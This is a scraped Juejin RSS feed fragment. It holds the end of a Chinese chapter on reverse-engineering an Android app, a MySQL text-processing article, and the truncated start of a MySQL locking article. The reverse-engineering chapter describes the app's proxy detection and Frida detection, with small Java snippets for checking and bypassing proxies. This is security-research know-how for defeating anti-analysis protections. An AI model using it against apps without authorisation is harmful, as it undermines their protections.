Process crashed: Segmentation fault
</code></pre>
<p><strong>APP直接崩溃了！</strong></p>
<p>Frida注入后，APP立即发生段错误（Segmentation fault）并退出。</p>
<p>这说明APP实现了<strong>反Frida检测机制</strong>。一旦检测到Frida的存在，就会触发崩溃，阻止任何动态调试。</p>
<h4 data-id="heading-26">1.6.4 这意味着什么？</h4>
<p>这款APP的安全防护不仅仅是网络层的：</p>

























<table><thead><tr><th>防护层</th><th>防护措施</th><th>效果</th></tr></thead><tbody><tr><td>网络层</td><td>代理检测 + 通信切换</td><td>抓包工具失效</td></tr><tr><td>运行时</td><td>Frida检测</td><td>动态调试失败</td></tr><tr><td>???</td><td>???</td><td>待发现</td></tr></tbody></table>
<p>看来，这将是一场持久战。</p>
<hr/>
<h3 data-id="heading-27">1.7 本章小结</h3>
<h4 data-id="heading-28">1.7.1 关键发现</h4>
<ol>
<li><strong>抓包完全失效</strong>：Charles、HttpCanary、iptables都无法捕获APP的网络请求</li>
<li><strong>精准代理检测</strong>：APP只检测HTTP代理，SOCKS代理可以正常使用</li>
<li><strong>静默通信切换</strong>：检测到代理后不崩溃，而是切换到直连模式</li>
<li><strong>Frida被检测</strong>：动态调试工具注入后APP直接崩溃</li>
</ol>
<h4 data-id="heading-29">1.7.2 技术启示</h4>
<p>这款APP展示了现代移动应用安全防护的一个重要趋势：<strong>精准打击 + 用户友好</strong>。</p>
<ul>
<li><strong>精准打击</strong>：只针对安全研究员的工具（HTTP代理、Frida），不影响普通用户</li>
<li><strong>用户友好</strong>：检测到威胁后不是简单崩溃，而是静默处理，保证用户体验</li>
</ul>
<p>这种设计思路值得所有移动开发者学习。</p>
<h4 data-id="heading-30">1.7.3 下一步</h4>
<p>既然网络抓包和动态调试都行不通，我需要：</p>
<ol>
<li><strong>静态分析</strong>：反编译APK，从代码层面理解APP的工作原理</li>
<li><strong>寻找突破口</strong>：分析代理检测和Frida检测的具体实现</li>
<li><strong>探索新工具</strong>：考虑使用Unidbg等离线模拟执行工具</li>
</ol>
<hr/>
<h3 data-id="heading-31">本章思考题</h3>
<ol>
<li>
<p>为什么APP选择"静默切换通信方式"而不是"直接崩溃"？这种设计有什么优缺点？</p>
</li>
<li>
<p>如果你是这款APP的安全工程师，你会如何改进现有的代理检测机制？</p>
</li>
<li>
<p>除了HTTP代理检测，还有哪些方法可以阻止抓包分析？</p>
</li>
</ol>
<h3 data-id="heading-32">章节附录</h3>
<h4 data-id="heading-33">A. 本章涉及的工具</h4>






























<table><thead><tr><th>工具</th><th>用途</th><th>官网</th></tr></thead><tbody><tr><td>Charles Proxy</td><td>HTTP/HTTPS抓包</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.charlesproxy.com%2F" target="_blank" title="https://www.charlesproxy.com/" ref="nofollow noopener noreferrer">www.charlesproxy.com/</a></td></tr><tr><td>HttpCanary</td><td>Android VPN抓包</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fhttpcanary.com%2F" target="_blank" title="https://httpcanary.com/" ref="nofollow noopener noreferrer">httpcanary.com/</a></td></tr><tr><td>Frida</td><td>动态插桩</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Ffrida.re%2F" target="_blank" title="https://frida.re/" ref="nofollow noopener noreferrer">frida.re/</a></td></tr><tr><td>Wireshark</td><td>网络协议分析</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wireshark.org%2F" target="_blank" title="https://www.wireshark.org/" ref="nofollow noopener noreferrer">www.wireshark.org/</a></td></tr></tbody></table>
<h4 data-id="heading-34">B. 本章关键代码</h4>
<p><strong>代理检测示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProxySet</span><span class="hljs-params">()</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">proxyHost</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">"http.proxyHost"</span>);
    <span class="hljs-keyword">return</span> proxyHost != <span class="hljs-literal">null</span> &amp;&amp; !proxyHost.isEmpty();
}
</code></pre>
<p><strong>绕过代理示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>.Builder()
    .proxy(Proxy.NO_PROXY)
    .build();
</code></pre>
<h4 data-id="heading-35">C. 参考资料</h4>
<ol>
<li>Android Proxy Settings: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Freference%2Fandroid%2Fnet%2FProxyInfo" target="_blank" title="https://developer.android.com/reference/android/net/ProxyInfo" ref="nofollow noopener noreferrer">developer.android.com/reference/a…</a></li>
<li>OkHttp Proxy Configuration: <a href="https://link.juejin.cn?target=https%3A%2F%2Fsquare.github.io%2Fokhttp%2F" target="_blank" title="https://square.github.io/okhttp/" ref="nofollow noopener noreferrer">square.github.io/okhttp/</a></li>
<li>Frida Documentation: <a href="https://link.juejin.cn?target=https%3A%2F%2Ffrida.re%2Fdocs%2F" target="_blank" title="https://frida.re/docs/" ref="nofollow noopener noreferrer">frida.re/docs/</a></li>
</ol>
<hr/>
<p><em>本章完</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL文本处理：全库搜索慢？正则清洗难？掌握这 3 个方法]]></title>    <link>https://juejin.cn/post/7592622563547496483</link>    <guid>https://juejin.cn/post/7592622563547496483</guid>    <pubDate>2026-01-08T20:04:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592622563547496483" data-draft-id="7592819937652670479" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL文本处理：全库搜索慢？正则清洗难？掌握这 3 个方法"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T20:04:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="数据小馒头"/> <meta itemprop="url" content="https://juejin.cn/user/48851852475720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL文本处理：全库搜索慢？正则清洗难？掌握这 3 个方法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/48851852475720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    数据小馒头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T20:04:16.000Z" title="Thu Jan 08 2026 20:04:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在数据库开发中，我们最不愿意面对的往往不是复杂的 Join，而是“文本处理”。</p>
<ul>
<li><strong>模糊搜索：</strong> 业务方要求“搜索包含‘苹果’的所有商品”，开发人员反手一个 LIKE '%苹果%'，导致全表扫描，数据库 CPU 飙升。</li>
<li><strong>数据清洗：</strong> 历史数据里混入了非法的手机号格式，需要清洗，只能写 Python 脚本把几百万条数据拉出来跑正则。</li>
<li><strong>多行合并：</strong> 前端要求把“用户拥有的所有标签”合并成一个逗号分隔的字符串返回，后端只能在内存里拼接。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e74639a8ba64780b1013728cb2c313d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507455&amp;x-signature=JzXF85aNWc7U9qmGgUPUKJfNW8I%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">一、 拒绝全表扫描：LIKE 的替代者——全文索引 (Full-Text)</h2>
<p>场景复现：</p>
<p>表 t_articles 有 100 万篇文章。需求是搜索内容中包含 "database" 的文章。</p>
<p><strong>低效解法：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_articles <span class="hljs-keyword">WHERE</span> content <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%database%'</span>;
</code></pre>
<p>原理分析：</p>
<p>标准的 B+ 树索引只能支持前缀匹配（LIKE 'database%'）。一旦通配符 % 出现在开头，索引立即失效，数据库必须逐行扫描（Full Table Scan），性能复杂度为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span>。</p>
<p><strong>技术解法：倒排索引 (Inverted Index)</strong></p>
<p>MySQL InnoDB 引擎支持 <strong>全文索引 (Full-Text Index)</strong>。它通过分词构建“词 -&gt; 文档ID”的倒排映射，实现 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> 或 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logN)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span> 级别的搜索。</p>
<p><strong>1. 创建索引：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> t_articles <span class="hljs-keyword">ADD</span> FULLTEXT INDEX ft_content (content);
</code></pre>
<p><strong>2. 使用 MATCH ... AGAINST 语法：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_articles 
<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(content) AGAINST(<span class="hljs-string">'database'</span> <span class="hljs-keyword">IN</span> <span class="hljs-keyword">NATURAL</span> <span class="hljs-keyword">LANGUAGE</span> MODE);
</code></pre>
<p><strong>实战注意点：</strong></p>
<ul>
<li><strong>最小词长：</strong> 默认情况下，少于 3 个字符的词（如 "it", "is"）会被忽略。可以通过 innodb_ft_min_token_size 调整。</li>
<li><strong>停用词 (Stopwords)：</strong> 常见的无意义词汇（"the", "and"）会被自动过滤。</li>
<li><strong>分词器：</strong> 对于中文搜索，必须使用 ngram 分词器（WITH PARSER ngram），否则无法正确切分中文词组。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9688c18513b549de9cfa9e74b6fb2573~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507455&amp;x-signature=tc%2FIK1qTxdWSzo9u%2Fdd3spveFxw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">二、 SQL 里的瑞士军刀：正则表达式 (RegExp)</h2>
<p>场景复现：</p>
<p>数据表中混入了脏数据，需要找出所有“非法的邮箱地址”进行标记；或者需要将手机号的中间四位脱敏为 ****。</p>
<p>低效解法：</p>
<p>LIKE 只能做简单的通配，无法表达“数字出现3次”这种逻辑。通常做法是写脚本把数据 Select 出来，用代码里的正则库处理完再 Update 回去。</p>
<p><strong>技术解法：MySQL 8.0 的正则函数族</strong></p>
<p>MySQL 8.0 引入了基于 ICU 库的完整正则支持（之前版本仅支持简单的 REGEXP 匹配）。</p>
<p><strong>1. 查找脏数据 (REGEXP)：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查找不包含 @ 符号，或者不以 .com/.net 等结尾的邮箱</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_users 
<span class="hljs-keyword">WHERE</span> email <span class="hljs-keyword">NOT</span> REGEXP <span class="hljs-string">'^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$'</span>;
</code></pre>
<p>2. 提取数据 (REGEXP_SUBSTR)：</p>
<p>从复杂的 JSON 字符串或日志文本中提取特定 ID：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 提取 "Order ID: 12345 Created" 中的数字</span>
<span class="hljs-keyword">SELECT</span> REGEXP_SUBSTR(log_content, <span class="hljs-string">'[0-9]+'</span>) <span class="hljs-keyword">FROM</span> t_logs;
</code></pre>
<p>3. 数据清洗与脱敏 (REGEXP_REPLACE) —— 杀手级功能：</p>
<p>直接在 SQL 层完成脱敏，无需应用层介入。</p>
<pre><code class="hljs language-scss" lang="scss">-- 将手机号 <span class="hljs-number">13812345678</span> 替换为 <span class="hljs-number">138</span>****<span class="hljs-number">5678</span>
-- 逻辑：捕获前<span class="hljs-number">3</span>位($<span class="hljs-number">1</span>)，忽略中间<span class="hljs-number">4</span>位，捕获后<span class="hljs-number">4</span>位($<span class="hljs-number">2</span>)，重新拼接
UPDATE t_users 
SET phone = <span class="hljs-built_in">REGEXP_REPLACE</span>(phone, '^([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]{<span class="hljs-number">3</span>})<span class="hljs-selector-attr">[0-9]</span>{<span class="hljs-number">4</span>}([<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]{<span class="hljs-number">4</span>})$', '$<span class="hljs-number">1</span>****$<span class="hljs-number">2</span>');
</code></pre>
<h2 data-id="heading-2">三、 行转列利器：GROUP_CONCAT 的陷阱与优化</h2>
<p>场景复现：</p>
<p>用户表 t_users 和 标签表 t_tags 是多对多关系。</p>
<p>前端 API 需要返回如下格式：</p>
<p>{ "user_id": 1, "tags": "Developer, Admin, VIP" }</p>
<p>低效解法：</p>
<p>先查用户，再循环查标签（N+1 查询）；或者查出所有关联数据，在应用层做 Map 聚合。</p>
<p><strong>技术解法：GROUP_CONCAT</strong></p>
<p>MySQL 提供了一个聚合函数，专门用于将“多行数据”合并为“一行字符串”。</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">SELECT</span> 
    u.id, 
    u.username,
    -- 将该用户的所有 tag_name 用逗号连接
    GROUP_CONCAT(t.tag_name <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> t.id DESC SEPARATOR <span class="hljs-comment">', ') as tags</span>
<span class="hljs-keyword">FROM</span> t_users u
<span class="hljs-keyword">JOIN</span> t_user_tags ut <span class="hljs-keyword">ON</span> u.id = ut.user_id
<span class="hljs-keyword">JOIN</span> t_tags t <span class="hljs-keyword">ON</span> ut.tag_id = t.id
<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> u.id;
</code></pre>
<p><strong>⚠️ 致命陷阱：默认长度限制</strong></p>
<p>很多开发者在开发环境测试没问题，一上生产环境发现标签被截断了。</p>
<p>这是因为 MySQL 对 GROUP_CONCAT 的结果长度有限制，由系统变量 group_concat_max_len 控制。</p>
<ul>
<li><strong>默认值：</strong> 仅 <strong>1024 字节</strong>。如果合并后的字符串超过 1KB，会被静默截断，且<strong>不会报错</strong>。</li>
</ul>
<p>解决方案：</p>
<p>在执行 SQL 前，或者在 Session 级别调大该参数：</p>
<pre><code class="hljs language-ini" lang="ini">SET SESSION <span class="hljs-attr">group_concat_max_len</span> = <span class="hljs-number">102400</span><span class="hljs-comment">; -- 设置为 100KB</span>
SELECT ...
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c199cb2df7124b55ae158a7db366e624~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507455&amp;x-signature=BT8shMIiv6DKflecXDXAeK%2BGVj4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">总结</h2>
<p>数据库不仅仅是存储引擎，它同样具备强大的计算和处理能力。</p>
<ol>
<li><strong>搜索：</strong> 遇到模糊匹配，别无脑 LIKE。如果数据量大且需要自然语言处理，请启用 <strong>Full-Text Index</strong>。</li>
<li><strong>清洗：</strong> 善用 MySQL 8.0 的 <strong>REGEXP_REPLACE</strong>，它能让你用一句 SQL 完成百万级数据的清洗和脱敏，效率远超 Python 脚本。</li>
<li><strong>聚合：</strong> 使用 <strong>GROUP_CONCAT</strong> 简化“一对多”查询，但永远不要忘记检查 group_concat_max_len 参数。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MySQL并发与锁：从“防止超卖”到排查“死锁”]]></title>    <link>https://juejin.cn/post/7592819937652637711</link>    <guid>https://juejin.cn/post/7592819937652637711</guid>    <pubDate>2026-01-08T19:58:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592819937652637711" data-draft-id="7592819937652621327" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MySQL并发与锁：从“防止超卖”到排查“死锁” "/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T19:58:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="数据小馒头"/> <meta itemprop="url" content="https://juejin.cn/user/48851852475720"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MySQL并发与锁：从“防止超卖”到排查“死锁” 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/48851852475720/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    数据小馒头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T19:58:29.000Z" title="Thu Jan 08 2026 19:58:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item 